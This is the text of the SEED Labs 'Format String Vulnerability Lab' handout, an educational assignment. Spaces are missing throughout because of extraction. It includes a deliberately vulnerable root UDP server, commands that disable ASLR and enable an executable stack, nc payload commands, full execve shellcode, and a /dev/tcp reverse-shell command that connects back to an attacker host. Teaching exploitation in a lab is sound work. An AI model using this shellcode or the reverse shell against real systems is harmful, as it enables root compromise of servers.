SEEDLabsŒFormatStringVulnerabilityLab 1 FormatStringVulnerabilityLab Copyright©2018WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1718086.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1LabOverview The printf functioninCisusedtoprintoutastringaccordingtoaformat.Itsargumentiscalled formatstring whichhowthestringshouldbeformatted.Formatstringsuseplaceholdersmarkedby % characterforthe prinf functiontoindataduringtheprinting.Theuseofformatstringsisnot onlylimitedtothe printf function manyotherfunctions suchas sprintf fprintf scanf alsouseformatstrings.Someprogramsallowuserstoprovidetheentireorpartofthecontents inaformatstring.Ifsuchcontentsarenotsanitized malicioususerscanusethisopportunitytogetthe programtorunarbitrarycode.Aproblemlikethisiscalled formatstringvulnerability Theobjectiveofthislabisforstudentstogainthehandexperienceonformat-stringvulnerability byputtingwhattheyhavelearnedaboutthevulnerabilityfromclassintoactions.Studentswillbegivena programwithaformat-stringvulnerability theirtaskistoexploitthevulnerabilitytoachievethefollowing damage 1 crashtheprogram 2 readtheinternalmemoryoftheprogram 3 modifytheinternalmem- oryoftheprogram andmostseverely 4 injectandexecutemaliciouscodeusingthevictimprogram's privilege.Thelastconsequenceisverydangerousifthevulnerableprogramisaprivilegedprogram suchas arootdaemon becausethatcangiveattackerstherootaccessofthesystem.Thislabcoversthefollowing topics Ł Formatstringvulnerability Ł Codeinjection Ł Shellcode Ł Reverseshell Readingsandrelatedtopics DetailedcoverageoftheformatstringattackcanbefoundinChapter6of theSEEDbook ComputerSecurity AHands-onApproach byWenliangDu Labenvironment Thislabhasbeentestedonourpre-builtUbuntu16.04VM whichcanbedownloaded fromtheSEEDwebsite 2LabTasks Tosimplifythetasksinthislab weturnofftheaddressrandomizationusingthefollowingcommand $ sudosysctl-wkernel.randomize_va_space=0 SEEDLabsŒFormatStringVulnerabilityLab 2 2.1Task1 TheVulnerableProgram Youaregivenavulnerableprogramthathasaformatstringvulnerability.Thisprogramisaserverprogram Whenitruns itlistenstoUDPport 9090 .WheneveraUDPpacketcomestothisport theprogramgets thedataandinvokes myprint toprintoutthedata.Theserverisarootdaemon i.e. itrunswiththe rootprivilege.Insidethe myprintf function thereisaformatstringvulnerability.Wewillexploitthis vulnerabilitytogaintherootprivilege Listing1 ﬂThevulnerableserverprogramﬂ # include < stdio.h > # include < stdlib.h > # include < unistd.h > # include < string.h > # include < sys/socket.h > # include < netinet/ip.h > # definePORT9090 char * secret= '' Asecretmessage\n '' unsignedinttarget=0x11223344 voidmyprintf char * msg { printf `` Theaddressofthe'msg'argument:0x % .8x\n '' unsigned & msg //Thislinehasaformat-stringvulnerability printf msg printf `` Thevalueofthe'target'variable :0x % .8x\n '' target } //Thisfunctionprovidessomehelpfulinformation.Itismeantto //simplifythelabtask.Inpractice attackersneedtofigure //outtheinformationbythemselves voidhelper { printf `` Theaddressofthesecret:0x % .8x\n '' unsigned secret printf `` Theaddressofthe'target'variable:0x % .8x\n '' unsigned & target printf `` Thevalueofthe'target'variable :0x % .8x\n '' target } voidmain { structsockaddr_inserver structsockaddr_inclient intclientLen charbuf 1500 helper intsock=socket AF_INET SOCK_DGRAM IPPROTO_UDP memset char * & server,0 sizeof server server.sin_family=AF_INET SEEDLabsŒFormatStringVulnerabilityLab 3 server.sin_addr.s_addr=htonl INADDR_ANY server.sin_port=htons PORT bind sock structsockaddr * & server sizeof server < 0 perror `` ERRORonbinding '' 1 { bzero buf,1500 recvfrom sock buf,1500-1,0 structsockaddr * & client & clientLen myprintf buf } close sock } Compilation Compiletheaboveprogram.Youwillreceiveawarningmessage.Thiswarningmessage isacountermeasureimplementedbythe gcc compileragainstformat-stringvulnerabilities.Wecanignore thiswarningmessagefornow $ gcc-zexecstack-oserverserver.c server.c Infunctionmyprintf server.c:13:5 warning formatnotastringliteralandnoformatarguments -Wformat-security printf msg ‹ Itshouldbenotedthattheprogramneedstobecompiledusingthe '' -zexecstack '' option allowsthestacktobeexecutable.ThisoptionhasnoimpactonTasks1to5 butforTasks6and7 itis important.Inthesetwotasks weneedtoinjectmaliciouscodeintothisserverprogram'sstackspace thestackisnotexecutable Tasks6and7willfail.Non-executablestackisacountermeasureagainststack- basedcodeinjectionattacks butitcanbedefeatedusingthereturn-to-libctechnique.Tosimplifythislab wesimplydisablethisdefeat-ablecountermeasure Runningandtestingtheserver TheidealsetupforthislabistoruntheserverononeVM andthen launchtheattackfromanotherVM.However itisacceptableifstudentsuseoneVMforthislab.Onthe serverVM werunourserverprogramusingtherootprivilege.Weassumethatthisprogramisaprivileged rootdaemon.Theserverlistenstoport 9090 .OntheclientVM wecanconnecttotheserverusingthe nc command wherethe '' -u '' meansUDP theserverprogramisaUDPserver .TheIPaddressin thefollowingexampleshouldbereplacedbytheactualIPaddressoftheserverVM 127.0.0.1 ifthe clientandserverrunonthesameVM //OntheserverVM $ sudo./server //OntheclientVM $ nc-u10.0.2.59090 messagetypedbyyou Yoncantypeanymessageontheclientside theserverprogramissupposedtoprintoutwhateveris typedbyyou.However aformatstringvulnerabilityexistsintheserverprogram's myprintf function SEEDLabsŒFormatStringVulnerabilityLab 4 whichallowsustogettheserverprogramtodomorethanwhatitissupposedtodo includinggivingusa rootaccesstotheservermachine.Intherestofthislab wearegoingtoexploitthisvulnerability 2.2Task2 UnderstandingtheLayoutoftheStack Figure1 Thestacklayoutwhen printf isinvokedfrominsideofthe myprintf function Tosucceedinthislab itisessentialtounderstandthestacklayoutwhenthe printf functionis invokedinside myprintf .Figure1depictsthestacklayout.Youneedtoconductsomeinvestigation andcalculation andthenanswerthefollowingquestions Ł Question1 Whatarethememoryaddressesatthelocationsmarkedby Ê Ë Ì ? Ł Question2 Whatisthedistancebetweenthelocationsmarkedby Ê Ì ? 2.3Task3 CrashtheProgram Theobjectiveofthistaskistoprovideaninputtotheserver suchthatwhentheserverprogramtriestoprint outtheuserinputinthe myprintf function itwillcrash 2.4Task4 PrintOuttheServerProgram'sMemory Theobjectiveofthistaskistogettheservertoprintoutsomedatafromitsmemory.Thedatawillbe printedoutontheserverside sotheattackercannotseeit.Therefore thisisnotameaningfulattack thetechniqueusedinthistaskwillbeessentialforthesubsequenttasks Ł Task4.A StackData Thegoalistoprintoutthedataonthestack anydataisHowmany formatdoyouneedtoprovidesoyoucangettheserverprogramtoprintoutthefour bytesofyourinput ? SEEDLabsŒFormatStringVulnerabilityLab 5 Ł Task4.B HeapData Thereisasecretmessagestoredintheheaparea andyouknowitsaddress yourjobistoprintoutthecontentofthesecretmessage.Toachievethisgoal youneedtoplace theaddress inthebinaryform ofthesecretmessageinyourinput i.e. theformatstring butitis diftotypethebinarydatainsideaterminal.Wecanusethefollowingcommandsdothat $ echo $ printf '' \x04\xF3\xFF\xBF '' % .8x % .8x|nc127.0.0.19090 //Orwecansavethedatainafile $ echo $ printf '' \x04\xF3\xFF\xBF '' % .8x % .8x > input $ nc127.0.0.19090 < input Itshouldbenotedthatmostcomputersaresmall-endianmachines sotostoreanaddress 0xAABBCCDD fourbytesona32-bitmachine inmemory theleastbyte 0xDD isstoredinthelowerad- dress whilethemostbyte 0xAA isstoredinthehigheraddress.Therefore whenwestore theaddressinabuffer weneedtosaveitusingthisorder 0xDD 0xCC 0xBB andthen 0xAA 2.5Task5 ChangetheServerProgram'sMemory Theobjectiveofthistaskistomodifythevalueofthe target variablethatisintheserverprogram Itsoriginalvalueis 0x11223344 .Assumethatthisvariableholdsanimportantvalue whichcanaffect thecontrolwoftheprogram.Ifremoteattackerscanchangeitsvalue theycanchangethebehaviorof thisprogram.Wehavethreesub-tasks Ł Task5.A Changethevaluetoadifferentvalue Inthissub-task weneedtochangethecontentof target variabletosomethingelse.Yourtaskisconsideredasasuccessifyoucanchangeittoa differentvalue regardlessofwhatvalueitmaybe Ł Task5.B Changethevalueto 0x500 Inthissub-task weneedtochangetothecontentofthe target variabletoavalue 0x500 .Yourtaskisconsideredasasuccessonlyifthevariable's valuebecomes 0x500 Ł Task5.C Changethevalueto 0xFF990000 Thissub-taskissimilartothepreviousone except thatthetargetvalueisnowalargenumber.Inaformatstringattack thisvalueisthetotalnumberof charactersthatareprintedoutbythe printf function printingoutthislargenumberofcharacters maytakehours.Youneedtouseafasterapproach.Thebasicideaistouse % hn insteadof % n wecanmodifyatwo-bytememoryspace insteadoffourbytes.Printingout 2 16 charactersdoesnot takemuchtime.Wecanbreakthememoryspaceofthe target variableintotwoblocksofmemory eachhavingtwobytes.Wejustneedtosetoneblockto 0xFF99 andsettheotheroneto 0x0000 Thismeansthatinyourattack youneedtoprovidetwoaddressesintheformatstring Informatstringattacks changingthecontentofamemoryspacetoaverysmallvalueisquitechal- lenging pleaseexplainwhyinthereport 0x00 isanextremecase.Toachievethisgoal weneedto useanovwtechnique.Thebasicideaisthatwhenwemakeanumberlargerthanwhatthestorage allows onlythelowerpartofthenumberwillbestored basically thereisanintegerovw .For example ifthenumber 2 16 +5 isstoredina16-bitmemoryspace 5 willbestored.Therefore togettozero wejustneedtogetthenumberto 2 16 =65 536 2.6Task6 InjectMaliciousCodeintotheServerProgram Nowwearereadytogoafterthecrownjewelofthisattack i.e. toinjectapieceofmaliciouscodetothe serverprogram sowecandeleteafromtheserver.Thistaskwilllaythegroundworkforournexttask SEEDLabsŒFormatStringVulnerabilityLab 6 whichistogainthecompletecontroloftheservercomputer Todothistask weneedtoinjectapieceofmaliciouscode initsbinaryformat intotheserver's memory andthenusetheformatstringvulnerabilitytomodifythereturnaddressofafunction whenthefunctionreturns itjumpstoourinjectedcode.Todeleteawewantthemaliciouscodeto executethe /bin/rm commandusingashellprogram suchas /bin/bash .Thistypeofcodeiscalled shellcode /bin/bash-c '' /bin/rm/tmp/myfile '' Weneedtoexecutetheaboveshellcodecommandusingthe execve systemcall whichmeanswe weneedtofeedthefollowingargumentsto execve execve addresstothe '' /bin/bash '' string addresstoargv ,0 whereargv 0 =addresstothe '' /bin/bash '' string argv 1 =addresstothe '' -c '' string argv 2 =addresstothe '' /bin/rm/tmp/myfile '' string argv 3 =0 Weneedtowritethemachinecodetoinvokethe execve systemcall whichmeansweneedtoset thefollowingfourregistersandtheninvokethe int0x80 instruction eax=0x0B execve 'ssystemcallnumber ebx=addresstothe '' /bin/bash '' string argument1 ecx=addresstoargv argument2 edx=0 argument3 forenvironmentvariables wesetittoNULL Settingthesefourregistersinashellcodeisquitechallenging mostlybecausewecannothaveanyzero inthecode zeroinstringterminatesthestring .Weprovidetheshellcodeinthefollowing.Detailed explanationofshellcodecanbefoundintheBuffer-OvwLabandinChapter4.6oftheSEEDbook Listing2 Shellcode /bin/bash-c '' /bin/rm/tmp/myfile '' //Push '' /bin////bash '' intostack `` \x31\xc0 '' //xorl % eax % eax eax=0 '' \x50 '' //pushl $ eax:0markstheendofastring '' \x68 '' '' bash '' //pushl '' bash '' '' \x68 '' '' //// '' //pushl '' //// '' '' //// '' isequivalentto '' '' '' \x68 '' '' /bin '' //pushl '' /bin '' '' \x89\xe3 '' //movl % esp % ebx Savethestringaddresstoebx //Push '' -ccc '' intostack `` \x31\xc0 '' //xorl % eax % eax '' eax=0 '' \x50 '' //pushl $ eax:0markstheendofastring '' \x68 '' '' -ccc '' //pushl '' -ccc '' '' -ccc '' isequivalentto '' -c '' '' \x89\xe0 '' //movl % esp % eax Savethestringaddresstoeax //Push '' /bin/rm/tmp/myfile '' intostack `` \x31\xd2 '' //xorl % edx % edx edx=0 '' \x52 '' //pushl % edx:0markstheendofastring '' \x68 '' '' ile '' //pushl '' ile '' À '' \x68 '' '' /myf '' //pushl '' /myf '' '' \x68 '' '' /tmp '' //pushl '' /tmp '' '' \x68 '' '' /rm '' //pushl '' /rm '' '' \x68 '' '' /bin '' //pushl '' /bin '' Á SEEDLabsŒFormatStringVulnerabilityLab 7 '' \x89\xe2 '' //movl % esp % edx Savethestringaddresstoedx //Constructtheargv array `` \x31\xc9 '' //xorl % ecx % ecx '' \x51 '' //pushl % ecx argv 3 =0 '' \x52 '' //pushl % edx argv 2 =addressof '' /bin/rm ... '' '' \x50 '' //pushl % eax argv 1 =addressof '' -c '' '' \x53 '' //pushl % ebx argv 0 =addressof '' /bin/bash '' '' \x89\xe1 '' //movl % esp % ecx Saveargv 'saddresstoecx //Setedxto0 `` \x31\xd2 '' //xorl % edx % edx Letedx=0 //Invokethesystemcall `` \x31\xc0 '' //xorl % eax % eax '' \xb0\x0b '' //movb $ 0x0b % al:0x0bisexecve 'snumber '' \xcd\x80 '' //int0x80 Invoketheexecve systemcall YouneedtopayattentiontothecodebetweenLines À Á .Thisiswherewepushthe /bin/rm commandstringintothebuffer.Inthistask youdonotneedtomodifythispart butforthenexttask doneedtomodifyit.The pushl instructioncanonlypusha32-bitintegerintothestack thatiswhywe breakthestringintoseveral4-byteblocks.Sincethisisashellcommand addingadditionalspacesdonot changethemeaningofthecommand therefore ifthelengthofthestringcannotbedividedbyfour canalwaysaddadditionalspaces.Thestackgrowsfromhighaddresstolowaddress i.e. reversely sowe needtopushthestringalsoreverselyintothestack Intheshellcode whenwestore '' /bin/bash '' intothestack westore '' /bin////bash '' hasalength12 amultipleof4.Theadditional '' '' areignoredby execve .Similarly whenwestore '' -c '' intothestack westore '' -ccc '' increasingthelengthto4.For bash thoseadditional c 'sare consideredasredundant ThecodeshownaboveisforaCprogram wherewestorethemachinecodeintoanarray.Forthistask wecandirectlytypethebinarycodeintoourcommand using n x likethefollowing thereisnoneedto typethequotationsbetweeninstructions .ItshouldbenotedthatwecanputNOP n 0x90 atthebeginning ofourshellcodetomakeourlifeeasier ? Pleaseexplainitinyourreport $ echo ... yourformatstring ... $ printf '' \x90\x90\x90\x90\x31\xc0 ... \x31\xd2\x52\68ile\x68/myf\x68/tmp\x68/rm\x68/bin\x89\xe2 ... \xcd\x80 '' Pleaseconstructyourinput feedittotheserverprogram anddemonstratethatyoucansuccessfully removethetargetInyourlabreport youneedtoexplainhowyourformatstringisconstructed.Please markonFigure1whereyourmaliciouscodeisstored pleaseprovidetheconcreteaddress 2.7Task7 GettingaReverseShell Whenattackersareabletoinjectacommandtothevictim'smachineusingTCPsessionhijacking theyare notinterestedinrunningonesimplecommandonthevictimmachine theyareinterestedinrunningmany commands.Whatattackerswanttoachieveistousetheattacktosetupabackdoor sotheycanusethis backdoortoconvenientlyconductfurtherdamages Atypicalwaytosetupbackdoorsistorunareverseshellfromthevictimmachinetogivetheattacker theshellaccesstothevictimmachine.Reverseshellisashellprocessrunningonaremotemachine connectingbacktotheattacker'smachine.Thisgivesanattackeraconvenientwaytoaccessaremote machineonceithasbeencompromised.ExplanationonhowareverseshellworksisprovidedinChapter3 SEEDLabsŒFormatStringVulnerabilityLab 8 oftheSEEDbook.ItcanalsobefoundintheGuidelinesectionoftheShellshockattacklabandtheTCP attacklab Togetareverseshell weneedtorunaTCPserverontheattackermachine.Thisserverwaitsfor ourmaliciouscodetocallbackfromthevictimservermachine.Thefollowing nc commandcreatesaTCP serverlisteningtoport 7070 $ nc-l7070-v YouneedtomodifytheshellcodelistedinListing2 soinsteadofrunningthe /bin/rm command using bash yourshellcoderunsthefollowingcommand.Theexampleassumesthattheattackermachine's IPaddressis 10.0.2.5 soyouneedtochangetheIPaddressinyourcode /bin/bash-c '' /bin/bash-i > /dev/tcp/10.0.2.5/70700 < & 12 > & 1 '' YouonlyneedtomodifythecodebetweenLines À Á sotheabove '' /bin/bash-i ... '' commandisexecutedbytheshellcode insteadofthe /bin/rm command.Onceyoutheshellcode youshouldconstructyourformatstring senditovertothevictimserverasaninput.Ifyourattackis successful yourTCPservershouldgetacallback andyouwillgetarootshellonthevictimmachine Pleaseprovidetheevidenceofsuccessinyourreport includingscreenshots 2.8Task8 FixingtheProblem Rememberthewarningmessagegeneratedbythe gcc compiler ? Pleaseexplainwhatitmeans.Please thevulnerabilityintheserverprogram andrecompileit.Doesthecompilerwarninggoaway ? Doyour attacksstillwork ? Youonlyneedtotryoneofyourattackstoseewhetheritstillworksornot 3Submission Youneedtosubmitadetailedlabreport withscreenshots todescribewhatyouhavedoneandwhatyou haveobserved.Youalsoneedtoprovideexplanationtotheobservationsthatareinterestingorsurprising Pleasealsolisttheimportantcodesnippets ifany followedbyexplanation.Simplyattachingcodewithout anyexplanationwillnotreceivecredits 